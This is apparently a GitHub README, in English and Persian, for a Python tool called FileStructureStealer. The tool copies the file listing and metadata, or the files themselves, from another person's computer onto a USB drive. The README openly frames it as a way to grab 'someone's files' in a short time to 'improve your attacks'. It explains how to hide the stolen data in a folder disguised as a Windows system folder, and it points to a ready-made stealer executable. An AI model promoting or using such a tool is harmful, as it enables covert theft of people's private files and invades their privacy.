# FileStructureStealer
This is a python program to copy all your files structures.

این یک برنامه پایتون برای کپی کردن ساختار فایل های شماست.
***
If you're not a developer, download and use the **FileStealerPC2USB.exe** in **Release(GitHub)**.

اگر برنامه نویس نیستید ، در قسمت **ریلیز** در سایت گیت هاب **فایل اجرایی** رو دانلود و اجرا کنید 
***

**/Main directory/**

StructureStealer.py: Script for both windows and Linux users

## What is it ??? چی هست ؟؟؟
This program helps you to copy structures.
Imagine that you have a really short time and a tiny space to copy someone's
files, so what if we copy the *name, location, size, create time, modified time* 
of all files to *analyze* what we need, and then come back with FileStealer to copy
them?

این برنامه به شما کمک میکند تا ساختار فایل ها را کپی کنید. فرض کنید زمان و فضای کمی برای کپی کردن فایل های یک شخص دارید، اگر بتوانید *اسم، مکان، تاریخ ساخت، تاریخ ویرایش* آن ها را داشته باشید چه ؟ و بعد با برنامه ی فایل_استیلر برگردید و آن ها کپی کنید .

for example:
you have a drive\directory which has these in it:

: برای مثال ، شما درایو/دایرکتوری دارید که شامل
    
    Newfile.psd
    MY_Program\structure.py
    MY_Program\.git\filelock
    ...
The program creat a directory in your USB(\\.Thum...) and for example a *Newfile.psd*
, if you open it with a text editor you see:

: برنامه یک دایرکتوری در یو اس بی شما میسازد و فایل بالا را در آن قرار میدهد که اگر آن را با ویرایشگر متن باز کنید ، میبینید
    
    [Size]
    1024 KB
    1 MB
    
    [Created Time]
    Jan 22 2020 20:02:01
    
    [Modified TIme]
    jan 23 2020 10;15:05
 
 And you can use this information to improve your attacks.
    
 .و میتوانید از این اطلاعات برای بهبود حملات خود استفاده کنید

## How to use:
### First : ابتدا 
You need to creat a folder in your USB with this name:

:برنامه نیاز دارد که دایرکتوری با نام زیر در یو اس بی خود بسازید

    .Thumbs.ms.{2227a280-3aea-1069-a2de-08002b30309d}
It tells the program that which *USB* is yours and does everything in that folder.

این پوشه ، یو اس بی شما را معلوم میکند و اتفاقات بعدی هم در همان پوشه خواهد افتاد.

Files and folders will go to ".Thumbs.ms.{2227a280-3aea-1069-a2de-08002b30309d}" directory .

بعد از اجرای برنامه ، فایل ها و فولدر ها به صورت خودکار در مسیر بالا در یو اس بی شما کپی میشوند

To access the copied files, rename ".Thumbs.ms.{2227a280-3aea-1069-a2de-08002b30309d}" directory in your USB to something else (perhaps doesn't have Thumbs.ms)
, or it will open "Printer and Scanners" in Windows and it's a hidden directory in most Linux OSes.

برای دسترسی به فایل های کپی شده ، اسم دایرکتوری بالا را عوض کنید ، البته ترجیحا از اسامی خودش مشتق نشده نباشد در غیر این صورت در ویندوز به صفحه ی پرینتر و اسکنر ها هدایت میشوید و در لینوکس هم دایرکتوری مخفی و غیرقابل دید است

### Second : دوم
Select between these 3 :

1)COPY Structure: It means that the program copy all files directly into your USB, but it may take lots of time.

2)SAVE structure to Log: This is much much faster than the the first one, it copies all files' addresses to a *Log.txt* .

3)LOAD structure from Log : If you used the second option, then you need this option to extract files from *Log.txt* 
 .

: بین سه گزینه یکی را انتخاب کنید

1) این گزینه به صورت مستقیم فایل ها را به یو اس بی شما کپی میکند ، ولی ممکن است زمان آن طولانی باشد

2) این راه بسیار سریع تر از راه اول است ، به این صورت که برنامه همه ی فایل ها را در یک فایل متنی در همان پوشه داخل یو اس بی شما ذخیره میکند

3) اگر از گزینه ی دوم استفاده کردید ، با این گزینه همه ی فایل های ذخیره شده در فایل متنی را خارج سازی کنید

## Notice:
Your USB will recognize only by having the ".Thumbs.ms.{2227a280-3aea-1069-a2de-08002b30309d}" directory but you can also change that with changing the "favorite" in the script.

.یو اس بی شما با داشتن دایرکتوری بالا شناخته میشود و میتوانید آن را در متغییر بالا عوض کنید 

***
Based on Python 3.5+, so can't use them in Windows XP, 98, and...

بر اساس پایتون 3.5 به بالا ، غیرقابل استفاده در ویندوز ایکس پی ، 98 و غیره 

***
Don't worry about missing and unarchived files, files will have the right name and path in your USB and a log.txt is in the main folder logs everything.

.نگران سردرگمی فایل ها نباشید ، همه ی فایل ها بر اساس اسم و مسیر درست کپی خواهند شد

Any error of copying files can be because of the limited access level. Don't worry about Persian(Arabic) characters, it supports them.

ارور های کپی کردن فایل مینواند به دلیل محدودیت در سطح دسترسی  باشد . نگران کارکتر های فارسی فایل ها و پوشه ها نباشید ، کاملا با 
برنامه همخوانی دارد . 
